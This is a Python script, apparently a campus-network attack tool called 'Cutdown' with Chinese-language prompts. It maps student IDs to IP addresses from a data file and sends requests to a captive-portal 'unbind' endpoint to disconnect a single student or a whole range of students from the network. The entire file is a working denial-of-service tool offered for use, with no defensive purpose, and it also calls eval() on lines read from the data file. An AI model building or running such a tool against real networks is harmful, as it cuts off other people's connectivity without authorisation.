import requests
import time
import json

def int_to_ip(integer_value):
    a = (integer_value >> 24) & 0xFF
    b = (integer_value >> 16) & 0xFF
    c = (integer_value >> 8) & 0xFF
    d = integer_value & 0xFF
    return f"{a}.{b}.{c}.{d}"

def ip_to_int(ip_address:str):
    a, b, c, d = map(int, ip_address.split('.'))
    return (a << 24) + (b << 16) + (c << 8) + d

def cutdown(**kwargs):
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept": "*/*",
        "Referer": "http://192.168.10.154/"
    }
    for key in kwargs:
        if key == 'single_ip':
            r = requests.get(f"http://192.168.10.154:801/eportal/portal/mac/unbind?wlan_user_mac=000000000000&wlan_user_ip={kwargs[key]}", headers=headers)
            print("[+] Sending Request....")
            if json.loads(r.text[12:-2])['result'] == 1:
                time.sleep(2)
                print(f"[+] The ip Address {kwargs[key]} Now has been shutdown.")
                print(f"{GREEN}[Info] {r.text}{RESET}")
            else:
                print('[*] Oops,got some issues')
                # print(json.loads(r.text[12:-2])['result'])
                print("Reponse: " + r.text)
        elif key == "MIN_STUDENT_ID" or key == "MAX_STUDENT_ID":
            for i in range(int(kwargs['MIN_STUDENT_ID']), int(kwargs['MAX_STUDENT_ID']) + 1):
                if not stuid_toip(data,str(i)) == 0:
                  r = requests.get(f"http://192.168.10.154:801/eportal/portal/mac/unbind?wlan_user_mac=000000000000&wlan_user_ip={ip_to_int(stuid_toip(data, str(i)))}", headers=headers)
                  print(f"[*] 正在给学号{i},IP为{stuid_toip(data, str(i))} 的哥们断网中...")
                  if r.status_code == 200:
                    print('OK.')
                    print(f"{GREEN}[INFO] {r.text}{RESET}\n")
                  else:
                    print(f'{RED}[FAILED] {r.status_code}{RESET}')
                else:
                    continue

def stuid_toip(data, stuid):
    for item in data:
        if item['user_account'] == stuid:
            return item['online_ip']
    else:
        print(f"{RED}[FAILED] 未找到学号为 {stuid} 人员ip数据.该人员可能未注册校园网{RESET}")
        return 0
        

def configuration(filename, data):
    with open(filename, 'r') as file:
        for line in file:
            # 假设每行数据是JSON格式
            data.append(eval(line.strip()))
    print(f'{GREEN}[+] 已读取{len(data)}行数据{RESET}\n')

def main(data_list):
    data_file = input("请输入数据来源:")
    configuration(data_file, data_list)
    print(
        """
   ______      __      __
  / ____/_  __/ /_____/ /___ _      ______ 
 / /   / / / / __/ __  / __ \\ | /| / / __ \\
/ /___/ /_/ / /_/ /_/ / /_/ / |/ |/ / / / /
\\____/\\__,_/\\__ /\\__,_/\\____/|__/|__/_/ /_/       
        """
    )

    print(f"{YELLOW}MADE BY E1iminate1337 VERSION:0.1v{RESET}\n")

    options = input(f"{GREEN}[*]{RESET} Welcome to the Cutdown script:\n1.单个学号断网\n2.范围学号断网\n选择:")
    if options == '1':
        stuID = input("\n[*] 输入单个目标学号:")
        print(f"{GREEN}[+] Target stuID:{stuID}{RESET}")
        cutdown(single_ip=stuid_toip(data_list, stuID))
    elif options == '2':
        min_stuid = input("\nMIN_STUDENT_ID:")
        max_stuid = input("MAX_STUDENT_ID:")
        cutdown(MAX_STUDENT_ID=max_stuid, MIN_STUDENT_ID=min_stuid)
    else:
        print(f"{RED}[FAILED] 请勿输入选项外的数字或内容{RESET}+\n{RED}[*] Exit!{RESET}")

if __name__ == "__main__":
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN = "\033[36m"
    WHITE = "\033[37m"
    RESET = "\033[0m"
    data = []

    main(data)
